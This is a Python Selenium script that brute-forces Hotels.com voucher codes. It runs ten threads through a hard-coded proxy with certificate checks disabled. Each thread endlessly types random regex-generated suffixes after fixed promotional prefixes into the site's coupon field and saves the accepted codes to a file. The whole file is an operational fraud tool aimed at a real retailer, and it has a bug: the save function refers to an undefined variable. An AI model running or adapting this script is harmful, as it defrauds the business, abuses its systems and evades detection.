from selenium import webdriver
chrome_options = webdriver.ChromeOptions()
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.proxy import Proxy, ProxyType
from threading import Thread
import names
import random
import rstr
import time
from colorama import Fore, init

def store_voucher(voucher):
	print( Fore.GREEN + '[i] VALID VALID VALID VALID Valid voucher [%s][%s]' % (code, voucher))
	with open("valid.txt", "a") as myfile:
		myfile.write(code + voucher + '\n')

def get_driver():
	driver = webdriver.Chrome('/nfs/2018/a/anjansse/Downloads/chromedriver', chrome_options=chrome_options)
	driver.get('https://uk.hotels.com/?rffrid=mdp.hcom.GB.550.000.00&PSRC=TESCO')
	driver.get('https://uk.hotels.com/ho113412/?q-check-out=2020-03-15&FPQ=3&q-check-in=2020-03-10&WOE=7&WOD=5&q-room-0-children=0&pa=3&tab=description&JHR=4&q-room-0-adults=3&YGF=1&MGT=2&ZSX=0&SYE=3')
	driver.find_element_by_xpath('//*[@id="rooms-and-rates.room-1-rateplan-1"]/button').submit()
	driver.execute_script('window.scrollTo(10, 1000);')
	driver.find_element_by_xpath('//*[@id="deals-and-discounts"]/div[1]/button').click()
	return driver

def init_env():
	codes = ['aftes110:', 'aftes200:', 'aftes300:', 'aftes500:', 'aftes750C:']
	code = codes[4]
	print('Hotels.com Generator')
	PROXY = '3.14.8.17:3128' 
	proxy = Proxy()
	proxy.proxyType = ProxyType.MANUAL
	proxy.autodetect = False
	proxy.httpProxy = proxy.sslProxy = proxy.socksProxy = PROXY
	chrome_options.Proxy = proxy
	chrome_options.add_argument("ignore-certificate-errors")
	driver = get_driver()
	return driver, code

def add_coupon_in_driver(driver, code, voucher):
	try:
		time.sleep(1)
		driver.find_element_by_xpath('//*[@id="coupon-code-field"]').send_keys(code + voucher)
		driver.find_element_by_xpath('//*[@id="coupon-code-apply-btn"]').click()
		time.sleep(3)
	except:
		driver.close()
		driver = get_driver()
		add_coupon_in_driver(driver, code, voucher)

def check_coupon_validity(driver, code, voucher):
	try:
		driver.find_element_by_xpath('//*[@id="coupon-code-remove-btn"]').click()
		store_voucher(voucher)
	except:
		print(Fore.RED + '[i] INVALID VOUCHER [%s]' % voucher)
		time.sleep(3)
		driver.find_element_by_xpath('//*[@id="coupon-code-error-message"]/em').click()
		driver.find_element_by_xpath('//*[@id="coupon-code-field"]').clear()
		return

def input_coupon(driver, code, voucher):
	print('ATTEMPTING CODE : {' + code + voucher + '}')
	add_coupon_in_driver(driver, code, voucher)
	check_coupon_validity(driver, code, voucher)

def checker(driver, code):
	while True:
		voucher = rstr.xeger(r'[a-z][A-Z]\d[A-Z]')
		input_coupon(driver, code, voucher)

if __name__ == '__main__':
	init(autoreset=True)
	i = 0
	threads = []
	for i in range(10):
		driver, code = init_env()
		t = Thread(target=checker, args=(driver,code,))
		threads.append(t)
		t.start()
	for t in threads:
		t.join()
	print("Thank you for hacking us.")


